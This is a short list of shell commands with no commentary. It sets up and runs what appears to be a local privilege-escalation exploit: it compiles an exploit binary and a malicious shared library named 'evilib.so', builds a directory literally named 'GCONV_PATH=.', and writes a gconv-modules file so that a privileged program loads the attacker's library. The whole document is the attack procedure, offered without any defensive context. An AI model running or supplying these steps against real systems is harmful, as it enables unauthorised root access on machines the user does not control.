gcc -o exp exp.c
mkdir GCONV_PATH=.
gcc -fPIC -shared -o ./evilib.so evilib.c
echo "module UTF-8// HACK// evilib 1" > gconv-modules
cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.
./exp
